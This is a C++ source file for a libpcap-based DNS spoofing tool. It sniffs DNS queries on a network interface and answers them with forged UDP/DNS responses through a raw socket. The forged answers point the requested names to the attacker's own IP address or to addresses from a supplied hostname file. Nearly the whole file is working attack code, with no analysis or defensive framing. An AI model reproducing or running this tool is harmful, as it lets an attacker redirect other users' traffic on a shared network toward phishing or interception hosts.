#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <map>
#include <string>
using namespace std;

map<string, string> host_to_ip_map;
/* default snap length (maximum bytes per packet to capture) */
#define SNAP_LEN 1518

/* ethernet headers are always exactly 14 bytes [1] */
#define SIZE_ETHERNET 14
#define SIZE_DNS_ANSWER_DATA_1 16
#define SIZE_DNS_HEADER 12

/* IP header */
struct sniff_ip {
        u_char  ip_vhl;                 /* version << 4 | header length >> 2 */
        u_char  ip_tos;                 /* type of service */
        u_short ip_len;                 /* total length */
        u_short ip_id;                  /* identification */
        u_short ip_off;                 /* fragment offset field */
        #define IP_RF 0x8000            /* reserved fragment flag */
        #define IP_DF 0x4000            /* dont fragment flag */
        #define IP_MF 0x2000            /* more fragments flag */
        #define IP_OFFMASK 0x1fff       /* mask for fragmenting bits */
        u_char  ip_ttl;                 /* time to live */
        u_char  ip_p;                   /* protocol */
        u_short ip_sum;                 /* checksum */
        struct  in_addr ip_src,ip_dst;  /* source and dest address */
};

struct dns_header {
	u_short id;
	u_short flags;
	u_short qdcount;
	u_short ancount;
	u_short nscount;
	u_short arcount;
};

struct dns_query {
	u_short type;
	u_short class1;
};

struct dns_answer_data{
    u_short type;
    u_short class1;
} __attribute__((packed, aligned(1)));

struct dns_answer_data_1{
    u_short name;
    u_short type;
    u_short class1;
    u_int ttl;    // 4 bytes for ttl
    u_short rdlength;    // 2 bytes for rdlength. This will be set to 4.
    u_int rdata; // 4 bytes for the IP address
} __attribute__((packed, aligned(1)));

struct dns_answer {
	u_char name[100];
	u_char separator;
};

#define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)
#define TH_OFF(th)      		((th)->th_off)

static int m;
char attacker_ip[20];

u_short htons_1;
u_short htons_8180;
u_short htons_c00c;

void get_attacker_machine_ip_address(char *device)
{
	int fd;
	struct ifreq ifr;

	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;

	strncpy(ifr.ifr_name, device, IFNAMSIZ-1);

	ioctl(fd, SIOCGIFADDR, &ifr);
	close(fd);

	strcpy(attacker_ip, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));

}
void read_file_ip_hostname(char *filename)
{
	FILE *f;
	char *ip, *name;
	char * line = NULL;
	size_t len = 0;
	ssize_t read;
	int number_of_lines = 0;
	if (filename != NULL)
	{
		if ((f = fopen(filename, "r")) == NULL)
			return;
		while ((read = getline(&line, &len, f)) != -1)
		{
			if ((ip = strtok(line, "\t ")) != NULL && (name = strtok(NULL, "\t\n ")) != NULL)
			{
				host_to_ip_map[string(name)] = string(ip);
			}
		}
		fclose(f);
	}
}

void extract_dns_request(char *hostname, char *request)
{
	unsigned int i, j, k;
	char *curr = hostname;
	unsigned int size;
	size = curr[0];
	j=0;
	i=1;
	while(size > 0)
	{
		for(k=0; k<size; k++)
		{
			request[j++] = curr[i+k];
		}
		request[j++]='.';
		i+=size;
		size = curr[i++];
	}
	request[--j] = '\0';
}

void
got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);

void
print_payload(const u_char *payload, int len);

void
print_hex_ascii_line(const u_char *payload, int len, int offset);

void
print_hex_ascii_line(const u_char *payload, int len, int offset)
{

	int i;
	int gap;
	const u_char *ch;

	/* offset */
	printf("%05d   ", offset);

	/* hex */
	ch = payload;
	for(i = 0; i < len; i++) {
		printf("%02x ", *ch);
		ch++;
		/* print extra space after 8th byte for visual aid */
		if (i == 7)
			printf(" ");
	}
	/* print space to handle line less than 8 bytes */
	if (len < 8)
		printf(" ");

	/* fill hex gap with spaces if not full line */
	if (len < 16) {
		gap = 16 - len;
		for (i = 0; i < gap; i++) {
			printf("   ");
		}
	}
	printf("   ");

	/* ascii (if printable) */
	ch = payload;
	for(i = 0; i < len; i++) {
		if (isprint(*ch))
			printf("%c", *ch);
		else
			printf(".");
		ch++;
	}

	printf("\n");
	return;
}

/*
 * print packet payload data (avoid printing binary data)
 */
void print_payload(const u_char *payload, int len)
{

	int len_rem = len;
	int line_width = 16;			/* number of bytes per line */
	int line_len;
	int offset = 0;					/* zero-based offset counter */
	const u_char *ch = payload;

	if (len <= 0)
		return;

	/* data fits on one line */
	if (len <= line_width) {
		print_hex_ascii_line(ch, len, offset);
		return;
	}

	/* data spans multiple lines */
	for ( ;; ) {
		/* compute current line length */
		line_len = line_width % len_rem;
		/* print line */
		print_hex_ascii_line(ch, line_len, offset);
		/* compute total remaining */
		len_rem = len_rem - line_len;
		/* shift pointer to remaining bytes to print */
		ch = ch + line_len;
		/* add offset */
		offset = offset + line_width;
		/* check if we have line width chars or less */
		if (len_rem <= line_width) {
			/* print last line and get out */
			print_hex_ascii_line(ch, len_rem, offset);
			break;
		}
	}
	return;
}

void send_forged_dns_response(unsigned long destination_address, u_int16_t destination_port, \
							char *data, u_short ip_length)
{
	int sd, one = 1;

	struct sockaddr_in source;
	sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);

	source.sin_family = AF_INET;
	source.sin_port = destination_port;
	source.sin_addr.s_addr = destination_address;
	
	setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
	sendto(sd, data, ip_length, 0, (struct sockaddr *)&source, sizeof(source));
	close(sd);
}
void print_ip_packet(const u_char *packet, u_char **payload, int *size_payload)
{
	const struct sniff_ip *ip;              /* The IP header */

	int size_ip;
	int size_tcp;
	/* define/compute ip header offset */
	ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
	size_ip = IP_HL(ip)*4;
	if (size_ip < 20) {
		printf("   * Invalid IP header length: %u bytes\n", size_ip);
		return;
	}
	
	const struct udphdr *udp;
	/* determine protocol */
	switch(ip->ip_p) {
		case IPPROTO_UDP:
		{
					udp = (struct udphdr*)(packet + SIZE_ETHERNET + size_ip);

					*payload = (u_char *)(packet + SIZE_ETHERNET);
					*size_payload = ntohs(ip->ip_len);

					char datagram[150];

					// Forging the IP header
					struct sniff_ip *spoofed_ip_header = (struct sniff_ip *)datagram;
					//memset(datagram, 0, 8192);

					spoofed_ip_header->ip_vhl = ip->ip_vhl;
					spoofed_ip_header->ip_tos = ip->ip_tos;

					int size_of_forged_dns_response = ntohs(ip->ip_len) + 16;
					spoofed_ip_header->ip_len = htons(size_of_forged_dns_response);
					spoofed_ip_header->ip_id = ip->ip_id;
					spoofed_ip_header->ip_off = ip->ip_off;
					spoofed_ip_header->ip_ttl = 200;
					spoofed_ip_header->ip_p = ip->ip_p;
					spoofed_ip_header->ip_sum = 0;
					spoofed_ip_header->ip_src.s_addr = ip->ip_dst.s_addr;
					spoofed_ip_header->ip_dst.s_addr = ip->ip_src.s_addr;

					// Forging the UDP header
					struct udphdr* spoofed_udp_header = (struct udphdr*)(datagram + size_ip);
					spoofed_udp_header->uh_sport = udp->uh_dport;
					spoofed_udp_header->uh_dport = udp->uh_sport;
					spoofed_udp_header->uh_ulen	 = htons(ntohs(udp->uh_ulen) + 16);
					spoofed_udp_header->uh_sum = 0;

					if(ntohs(udp->uh_dport) == 53)
					{
						// Forging the DNS Header
						struct dns_header* spoofed_dns_header = (struct dns_header*)(datagram + size_ip + 8);
						const struct dns_header *dns;
						dns = (struct dns_header*)(packet + SIZE_ETHERNET + size_ip + 8);
						spoofed_dns_header->id = dns->id;
						memcpy(&spoofed_dns_header->flags, &htons_8180, 2); //htons(33152); // Setting flags as 8180 (33152 is 81 80 in hexadecimal)
						memcpy(&spoofed_dns_header->qdcount, &htons_1, 2);
						memcpy(&spoofed_dns_header->ancount, &htons_1, 2);
						spoofed_dns_header->nscount = 0;
						spoofed_dns_header->arcount = 0;

						// Forging the DNS Answer

						// Copying the domain name
						char name1[100];
						//memset(name1, '\0', sizeof(name1));
						char *domain = (char*)(packet + SIZE_ETHERNET + size_ip + 8 + SIZE_DNS_HEADER);
						char request[100];
						extract_dns_request(domain, request);
						char temp[20];
						strcpy(temp, attacker_ip);
						if(host_to_ip_map.size() > 0)
						{
							string ip_address = host_to_ip_map[request];
							fprintf(stderr, "MAPPed IS is %s\n",  ip_address.c_str());
							if(ip_address == "")
								return;
							else
								strcpy(temp, ip_address.c_str());
						}

						int domain_length = strlen(domain);

						struct dns_answer* spoofed_dns_answer = (struct dns_answer*)(datagram + size_ip + 8 + SIZE_DNS_HEADER);

						strcpy((char*)spoofed_dns_answer->name, (const char*)domain);

						const struct dns_query *query;
						query = (struct dns_query*)(packet + SIZE_ETHERNET + size_ip + 8 + SIZE_DNS_HEADER \
												 + domain_length + 1);


						// Copying the null terminator for end of the domain and also copying the type and class1 fields
						spoofed_dns_answer->separator = 0;
						// Populating Answer Data
						struct dns_answer_data* answer_data;
						answer_data = (struct dns_answer_data*)(datagram + size_ip + 8 + SIZE_DNS_HEADER \
									+ domain_length + 1);
						memcpy(&answer_data->type, &htons_1, 2);
						memcpy(&answer_data->class1, &htons_1, 2);

						
						struct dns_answer_data_1* answer_data1;
						answer_data1 = (struct dns_answer_data_1*)(datagram + size_ip + 8 + SIZE_DNS_HEADER \
									+ domain_length + 1 + sizeof(struct dns_answer_data));
						memcpy(&answer_data1->name, &htons_c00c, 2);
						memcpy(&answer_data1->type, &htons_1, 2);
						memcpy(&answer_data1->class1, &htons_1, 2);
						answer_data1->ttl = htonl(600); // Keeping a 
						answer_data1->rdlength = htons(4); // ip value is 4 bytes, hence this is 4
						struct in_addr addr;
						inet_pton(AF_INET, temp, &addr);
						answer_data1->rdata = addr.s_addr; //htonl(2130706432);  // 127.0.0.0

						if(ntohs(query->type) != 1 || ntohs(query->class1) != 1)
							return;

						send_forged_dns_response(ip->ip_src.s_addr, udp->uh_sport, datagram, size_of_forged_dns_response);
						printf("Response Start\n");
						u_char *pay1 = (u_char*)datagram;
						print_payload(pay1, sizeof(struct sniff_ip) + sizeof(struct udphdr) + sizeof(struct dns_header) \
							+ strlen(domain) + 1 + sizeof(struct dns_answer_data) + sizeof(struct dns_answer_data_1));
						printf("Response End\n");
					}
					else if(ntohs(udp->uh_sport) == 53)
					{
						*payload = (u_char *)(packet + SIZE_ETHERNET);
						*size_payload = ntohs(ip->ip_len);
						printf("Actual Response Start\n");
						print_payload(*payload, *size_payload);
						printf("Actual Response End\n");
					}
			}
			break;
		default:
			break;
	}
}
void
got_packet(u_char *stringExpression, const struct pcap_pkthdr *header, const u_char *packet)
{
	/* declare pointers to packet headers */
	const struct ether_header *ethernet;  /* The ethernet header [1] */

	int size_payload;
	u_char *payload;
	
	ethernet = (struct ether_header*)(packet);
	
	switch(ntohs(ethernet->ether_type))
	{
		case ETHERTYPE_IP:
			print_ip_packet(packet, &payload, &size_payload);
			break;
		default:
			break;
	}
}

int main(int argc, char **argv)
{
	//thiszone = localtime(0);
	char *dev = NULL;			/* capture device name */
	char *pcapFileName = NULL;
	char *stringExpression = NULL;
	char *filter_exp;		/* filter expression [3] */

	char errbuf[PCAP_ERRBUF_SIZE];		/* error buffer */
	pcap_t *handle;				/* packet capture handle */

	struct bpf_program fp;			/* compiled filter program (expression) */
	bpf_u_int32 mask;			/* subnet mask */
	bpf_u_int32 net;			/* ip */
	int num_packets = 0, index;			/* number of packets to capture */

	char c;
	while ((c = getopt (argc, argv, "i:f:")) != -1)
	{
		switch(c) {
			case 'i':
					dev = optarg;
					break;
			case 'f':
					pcapFileName = optarg;
					break;
			default:
					break;
		}

    }
    index = optind;
	htons_1 = htons(1);
	htons_8180 = htons(33152);
	htons_c00c = htons(49164);
    filter_exp = argv[index];
    if(dev == NULL)
    {
    	dev = pcap_lookupdev(errbuf);
		if (dev == NULL) {
			fprintf(stderr, "Couldn't find default device: %s\n",
			    errbuf);
			return -1;
		}
	}

	get_attacker_machine_ip_address(dev);
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n",
		    dev, errbuf);
		net = 0;
		mask = 0;
	}

	if(pcapFileName != NULL)
	{
		read_file_ip_hostname(pcapFileName);
	}
	handle = pcap_open_live(dev, SNAP_LEN, 0, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}

	if (pcap_datalink(handle) != DLT_EN10MB) {
		fprintf(stderr, "%s is not an Ethernet\n", dev);
		return -1;
	}

    string filter_expression_final = "udp and dst port domain";
    if(filter_exp != NULL)
        filter_expression_final = filter_expression_final + " and " + string(filter_exp);

	/* compile the filter expression */
	if (pcap_compile(handle, &fp, filter_expression_final.c_str(), 0, net) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n",
		    filter_exp, pcap_geterr(handle));
		return -1;
	}

	/* apply the compiled filter */
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n",
		    filter_exp, pcap_geterr(handle));
		return -1;
	}

	/* now we can set our callback function */
	pcap_loop(handle, num_packets, got_packet, (u_char*)stringExpression);

	pcap_freecode(&fp);
	pcap_close(handle);
	return 0;
}
